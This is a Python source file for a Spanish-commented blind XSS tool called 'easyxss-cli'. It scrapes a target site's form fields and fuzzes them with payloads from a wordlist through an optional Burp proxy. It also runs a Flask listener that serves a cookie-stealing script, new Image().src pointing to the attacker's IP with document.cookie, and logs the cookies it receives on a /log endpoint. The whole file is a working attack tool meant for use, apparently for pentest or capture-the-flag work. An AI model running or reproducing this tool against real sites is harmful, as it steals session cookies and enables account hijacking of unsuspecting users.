import random
import requests
from bs4 import BeautifulSoup
from flask import Flask,request,jsonify
import logging as log
import argparse
import json
import sys
from urllib.parse import urlparse
import socket
import fcntl
import struct
import sys
import string
write_dir = None
log.basicConfig(filename='example.log', level=log.DEBUG,
format='%(asctime)s %(levelname)s:%(message)s')
db = dict()


app = Flask(__name__)



def get_ip_address(ifname: str) -> str:
    """
    Obtiene la dirección IPv4 de una interfaz de red en Linux.
    :param ifname: Nombre de la interfaz (ej. 'tun0')
    :return: Dirección IPv4 como cadena
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(
            fcntl.ioctl(
                sock.fileno(),
                0x8915,  
                struct.pack('256s', ifname.encode('utf-8')[:15])
            )[20:24]
        )
    except OSError as e:
        raise RuntimeError(f"No se pudo obtener la IP de {ifname}: {e}")


diccionario = {
    "post": [{'username': str}, {'email': str}],
    "get": [{'year': int}, {'country': str}]
}

app = Flask(__name__)

from typing import List, Protocol


class Observer(Protocol):
    def update(self, payload: str, attempts_left: int) -> None:
        ...


class BruteForceBackend:
    def __init__(self, wordlist: str, encoding="utf-8",refresh_payload_on:int=3):
        self.wordlist = wordlist
        self.encoding = encoding
        self.refresh_payload_on_n_occurrences: int = refresh_payload_on
        self._payload_generator = self.load_wordlist()
        self._payload = None
        self._attempts_left = 0
        self._observers: List[Observer] = []

        
        self._next_payload()

    def attach(self, observer: Observer) -> None:
        """Registrar un observador"""
        self._observers.append(observer)

    def detach(self, observer: Observer) -> None:
        """Eliminar un observador"""
        self._observers.remove(observer)

    def notify(self) -> None:
        """Notificar a todos los observadores"""
        for obs in self._observers:
            obs.update(self._payload, self._attempts_left)

    def _next_payload(self) -> None:
        """Cargar el siguiente payload del wordlist"""
        try:
            self._payload = next(self._payload_generator).strip()
            self._attempts_left = self.refresh_payload_on_n_occurrences
        except StopIteration:
            self._payload = None
            self._attempts_left = 0

    def get_payload(self) -> str:
        """Acceso al payload actual"""
        if self._payload is None:
            return None

        
        self._attempts_left -= 1
        self.notify()

        
        if self._attempts_left <= 0:
            self._next_payload()

        return self._payload

    def load_wordlist(self):
        with open(self.wordlist, "r", encoding=self.encoding) as rd:
            for x in rd.readlines():
                yield x



class Child:
    def update(self, payload: str, attempts_left: int) -> None:
        log.info(f"[Child] Payload actual: {payload}, intentos restantes: {attempts_left}")


def testObserver():
    backend = BruteForceBackend("wordlist.txt")
    child1 = Child()
    child2 = Child()

    backend.attach(child1)
    backend.attach(child2)

    
    for _ in range(10):
        p = backend.get_payload()
        print(f"Backend entregó: {p}")

class ObservableRepository:
    _fuzzer_observer = None
    _server_bruteforce_observer = None
class ChildObserver:
    def get_form_fuzzer_observer(self,wordlist,dict_forms:dict, encoding, refresh_payload_on):
        ...
    def get_server_observer(self,*args):
        ...
class FormFuzzer(ChildObserver):
    def __init__(self, wordlist,dict_forms:dict, encoding, refresh_payload_on):
        self.get_form_fuzzer_observer(wordlist,dict_forms, encoding, refresh_payload_on)
        self.target = dict_forms
        self.dict_forms = json.loads(dict_forms)
        self.generatorChars = {
            "email":string.ascii_lowercase + '@',
            "number":string.digits + '',
            "text":string.printable + '',
        }
    def get_form_fuzzer_observer(self,wordlist,dict_forms:dict, encoding, refresh_payload_on):
        self.backend_observer = BruteForceBackend(
            wordlist, encoding, refresh_payload_on
        )
        self.backend_observer.attach(self)
        self.backend_observer.load_wordlist()
        ObservableRepository._fuzzer_observer = self.backend_observer
    @staticmethod
    def use_anty_csrf(soup):
        
        
        token = None

        
        csrf_input = soup.find("input", {"name": "csrf","name":"csrf_token"})
        if csrf_input:
            token = csrf_input.get("value")
        return token

    @staticmethod
    def extraer_campos_form(url: str,headers:dict[str,str]):
        
        response = requests.get(url,headers=headers)
        response.raise_for_status()
        html = response.text
        
        soup = BeautifulSoup(html, 'html.parser')
        

        resultado = {"post": []}

        
        for form in soup.find_all('form'):
            
            for campo in form.find_all(['input', 'select', 'textarea']):
                nombre = campo.get('name')
                tipo = campo.get('type', 'text')

                if nombre:
                    
                    if tipo in ['text', 'email']:
                        resultado["post"].append({nombre: 'str'})
                    elif tipo in ['password']:
                        resultado["post"].append({nombre: 'str'})
                    elif tipo in ['date', 'datetime-local', 'month', 'year']:
                        resultado["post"].append({nombre: 'date'})
                    else:
                        
                        resultado["post"].append({nombre: 'str'})

        return resultado
    @staticmethod
    def get_metadata_from_dict(forms:dict):
        forms_n = len(forms.keys())
        total_items = 0
        for type,attrs in forms.items():
            total_items += len(attrs)
        return forms_n,total_items
    def payload_dopage(self,endpoint,ip=None,port=5000):
        
        payload = ''
        if not(ip):
            ip = get_ip_address('tun0')
        try:
            payload = self.backend_observer.get_payload().format(ip=ip,port=port,endpoint=endpoint)
        except:
            print(f'[!] Warning: Invalid payload {self.backend_observer.get_payload()}')
        return payload or ''
        
    def random_gen(self,key,type,character_n:int = 10):
        characters = None
        
        label = ''
        if 'email' in key:
            characters = self.generatorChars.get('email','')
            
            label = 'email'
        elif 'str' in type:
            characters = self.generatorChars.get('text','')
            label='text'
        elif 'number' in type or 'int' in type:
            characters = self.generatorChars.get('number','')
            label='number'
        print(f'[+] chosing {label} with the set of {characters} for [{key},{type}]')
        gen = ''.join([characters[-1] if character_n//2 == x else random.choice(characters) for x in range(0,character_n) ])
        if label == 'email':
            return gen + '.com'
    def requestor_get(self, url: str,proxies:dict,ignore_fields:list,headers = {}, csrf: bool = False):
        """
        Realiza una solicitud GET a la URL proporcionada, integrando payloads del backend si está disponible.
        Opcionalmente maneja CSRF.
        """
        payload = self.payload_dopage('') if self.backend_observer else None
        params = {}
        if payload:
            
            
            
            for method in self.dict_forms.keys():
                
                items = self.dict_forms[method]
                for values in items:
                    for key in values.keys():
                        if key in ignore_fields:
                            params[key] = self.random_gen(key,values[key])
                            continue 
                        params[key] = self.payload_dopage(key) if self.backend_observer else None  
                print(f'[+] payload: {params}')
        if csrf:
            
            response = requests.get(url,proxies=proxies)
            soup = BeautifulSoup(response.text, "html.parser")
            token = self.use_anty_csrf(soup)
            if token:
                headers['X-CSRF-Token'] = token  

        try:
            response = requests.get(url, params=params, headers=headers,proxies=proxies)
            log.info(f"GET request to {url} with params {params} - Status: {response.status_code}")
            return response
        except Exception as e:
            log.error(f"Error in GET request: {e}")
            return None

    def requestor_post(self, url: str, proxies:dict,ignore_fields:list,headers = {},csrf: bool = False):
        """
        Realiza una solicitud POST a la URL proporcionada, cargando datos desde un archivo JSON,
        integrando payloads del backend si está disponible. Opcionalmente maneja CSRF.
        """

        
        payload = self.payload_dopage('') if self.backend_observer else None
        data = {}
        if payload:
            
            for method in self.dict_forms.keys():
                for values in self.dict_forms[method]: 
                    for key in values.keys():
                        if not(key in ignore_fields):
                            data[key] = self.payload_dopage(key) if self.backend_observer else None
                            
                    

        if csrf:
            
            response = requests.get(url)
            soup = BeautifulSoup(response.text, "html.parser")
            token = self.use_anty_csrf(soup)
            if token:
                self.dict_forms['csrf_token'] = token  

        try:
            response = requests.post(url, data=data, headers=headers,proxies=proxies)
            log.info(f"POST request to {url} with data {self.dict_forms} - Status: {response.status_code}")
            
            return response
        except Exception as e:
            log.error(f"Error in POST request: {e}")
            return None

    def update(self, payload: str, attempts_left: int) -> None:
        log.info(f"[Child] Payload actual: {payload}, intentos restantes: {attempts_left}")

    def bruteformce_request_trigger(self,payload):
        
        
        payload = self.backend_observer.get_payload()
        return payload

class HijackingUtils(ChildObserver):
    def __init__(self,wordlist, encoding, refresh_payload_on):
        self.get_server_observer(wordlist, encoding, refresh_payload_on)
        
    def update(self, payload: str, attempts_left: int) -> None:
        log.info(f"[Child] Payload actual: {payload}, intentos restantes: {attempts_left}")
    def get_server_observer(self, *args):
        self.backend_observer = BruteForceBackend(
            *args
        )
        self.backend_observer.attach(self)
        self.backend_observer.load_wordlist()
        ObservableRepository._server_bruteforce_observer = self.backend_observer


def saveonCoincidence(output):
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
        print(f"[+] Resultado guardado en: {output}")
def crear_endpoints(diccionario,port=5000,interfaz='tun0'):
    
    ip = get_ip_address(interfaz)
    for metodo, campos in diccionario.items():
        metodo = metodo.lower()
        for campo in campos:
            nombre_campo = list(campo.keys())[0]

            
            def handler(nombre=nombre_campo, metodo=['get','post']):
                
                
                
                
                
                
                
                print(f"[+] conexion recibida en endpoint {nombre_campo}")
                
                return f"new Image().src='http://{ip}:{port}/log?c='+document.cookie"
                
                
                
                
                
                
                
            
            app.add_url_rule(
                f"/{nombre_campo}",
                endpoint=f"{metodo}_{nombre_campo}",
                view_func=handler,
                methods=['post','get']
            )


def log_url():
    
    log_param = request.args.get('c', '')
    print(f'[+] Log recibido: {log_param}')
    
    if 'logs' not in db:
        db['logs'] = []
    db['logs'].append(log_param)
    return ''

app.add_url_rule(
    "/log",
    endpoint="log",
    view_func=log_url,
    methods=['GET']
)

def validar_url(url: str) -> bool:
    try:
        p = urlparse(url)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except Exception:
        return False


def analyze_url(url: str, wordlist: str = None, analyzisOutput:str=None,output: str = None, start_server: bool = False,headers:dict[str,str]=dict(),host: str = "127.0.0.1", port: int = 5000,interfaz='tun0'):
    if not validar_url(url):
        raise ValueError(f"URL no válida: {url}")

    print(f"[+] Analizando: {url}")
    try:
        diccionario = FormFuzzer.extraer_campos_form(url,headers=headers)
    except Exception as e:
        print(f"Error extrayendo el formulario: {e}", file=sys.stderr)
        raise

    
    
    pretty = json.dumps(diccionario, indent=2, ensure_ascii=False)
    print(pretty)

    
    if output:
        write_dir = output
    if analyzisOutput:
        with open(analyzisOutput, "w", encoding="utf-8") as f:
            json.dump(pretty, f, ensure_ascii=False, indent=2)
        print(f"[+] Resultado guardado en: {analyzisOutput}")

    
    inet = None
    if interfaz:
        inet = interfaz 
    if start_server:
        print("[+] Creando endpoints dinámicos a partir del diccionario...")
        crear_endpoints(diccionario,interfaz=inet)
        print(f"[+] Iniciando servidor Flask en {host}:{port} (CTRL+C para detener)")
        
        app.run(host='0.0.0.0', port=port, debug=True)
class ParseHeaders(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        
        headers = getattr(namespace, self.dest, {}) or {}
        try:
            key, value = values.split(":", 1)
        except ValueError:
            raise argparse.ArgumentError(self, f"Formato inválido para header: {values}. Usa Clave:Valor")
        headers[key.strip()] = value.strip()
        setattr(namespace, self.dest, headers)


def fuzz(url: str, request_file: str, method: str, wordlist: str, ignore_fields: list = None, headers: dict = None, csrf: bool = False, refresh_payload_on: int = 10,proxies:dict[str,str]= dict(),use_burp:dict = None):
    """
    Función para fuzzing: inyecta payloads de la wordlist en requests GET o POST usando FormFuzzer.
    """
    if not(proxies):
        proxies = use_burp
    elif proxies:
        proxies.update(use_burp)
    if ignore_fields is None:
        ignore_fields = []
    if headers is None:
        headers = {}

    
    try:
        with open(request_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except Exception as e:
        print(f"Error cargando {request_file}: {e}", file=sys.stderr)
        return

    
    fuzzer = FormFuzzer(wordlist=wordlist, dict_forms=data, encoding='utf-8', refresh_payload_on=refresh_payload_on)

    method = method.lower()
    if method not in ['get', 'post']:
        print("Método no soportado. Usa 'get' o 'post'.", file=sys.stderr)
        return

    print(f"[+] Iniciando fuzzing en {url} con método {method.upper()}")
    
    
    while True:
        try:
            if method == 'get':
                response = fuzzer.requestor_get(url, ignore_fields=ignore_fields, headers=headers, csrf=csrf,proxies=proxies)
            else:
                response = fuzzer.requestor_post(url, ignore_fields=ignore_fields, headers=headers, csrf=csrf,proxies=proxies)

            if response:
                print(f"Payload inyectado - Status: {response.status_code}")
                
            else:
                print("Error en la solicitud")

            
            if fuzzer.backend_observer._payload is None:
                break

        except Exception as e:
            print(f"Error durante fuzzing: {e}", file=sys.stderr)
            break

    print("[+] Fuzzing completado")

def main():
    parser = argparse.ArgumentParser(prog="easyxss-cli", description="CLI base para analizar formularios con easyXSS")
    sub = parser.add_subparsers(dest="command", required=True)

    p_analyze = sub.add_parser("analyze", help="Analizar una URL y extraer campos de formulario")
    p_analyze.add_argument("-u", "--url", required=True, help="URL del formulario a analizar (http(s)://...)")
    p_analyze.add_argument("-w", "--wordlist", help="Ruta opcional a wordlist (aún no usada automáticamente)")
    p_analyze.add_argument("-a", "--analyzisOutput", help="Archivo JSON donde guardar el resultado")
    p_analyze.add_argument("-o", "--output", help="Archivo JSON donde guardar el resultado (credenciales capturadas)")
    p_analyze.add_argument(
        "-H", "--headers",
        help="Agregar headers en formato Clave:Valor",
        action=ParseHeaders
    )
    p_analyze.add_argument("--start-server", action="store_true", help="Crear endpoints y arrancar servidor Flask con los campos extraídos")
    p_analyze.add_argument("--host", default="127.0.0.1", help="Host para el servidor Flask (cuando se usa --start-server)")
    p_analyze.add_argument("--port", type=int, default=5000, help="Puerto para el servidor Flask (cuando se usa --start-server)")
    p_analyze.add_argument('--interfaz',default='tun0',help="interfaz a la cual escuchar")
    p_fuzz = sub.add_parser("fuzz",help="Inyectar Payloads blind xss")
    p_fuzz.add_argument('-r','--requestFile',help='indicar el json file donde se especifican los parametros que maneja el formulario del sitio web')
    p_fuzz.add_argument('-u','--url',help='url del sitio',required=True)
    p_fuzz.add_argument('-p','--proxies',help='establecer proxys como un web proxy para debuggeo formato de entrada: json {"http":"127.0.0.1:8080"}',type=json.loads)
    p_fuzz.add_argument('-w','--webProxy',help='usar web proxies como burp o zapproxy (por defecto usa el puerto 8080)',type=json.loads,default={'http':'127.0.0.1:8080',"https":'127.0.0.1:8080'})
    p_fuzz.add_argument(
        "-H", "--headers",
        help="Agregar headers en formato Clave:Valor",
        action=ParseHeaders
    )
    p_fuzz.add_argument('-X','--Method',help="especificar el metodo (get|post)",required=True)
    p_fuzz.add_argument("-w", "--wordlist", required=True, help="Ruta a la wordlist para payloads")
    p_fuzz.add_argument("-i", "--ignore", action='append', help="Campos a ignorar (puede repetirse)")
    p_fuzz.add_argument("--csrf", action="store_true", help="Habilitar manejo de CSRF")
    p_fuzz.add_argument("--refresh", type=int, default=10, help="Número de intentos antes de refrescar payload")


    args = parser.parse_args()
    if args.command == "analyze":
        try:
            analyze_url(args.url, wordlist=args.wordlist, output=args.output, start_server=args.start_server, host=args.host, port=args.port,analyzisOutput=args.analyzisOutput
                        ,headers=args.headers,
                        interfaz=args.interfaz)
        except Exception as e:
            print(f"Fallo: {e}", file=sys.stderr)
            sys.exit(1)
    if args.command == "fuzz":
        try:
            fuzz(
                url=args.url,
                request_file=args.requestFile,
                method=args.Method,
                wordlist=args.wordlist,
                ignore_fields=args.ignore or [],
                headers=args.headers or {},
                csrf=args.csrf,
                refresh_payload_on=args.refresh,
                proxies=args.proxies,
                use_burp=args.webProxy
            )
        except Exception as e:
            print(f"Fallo: {e}", file=sys.stderr)
            sys.exit(1)
if __name__ == "__main__":
    main()
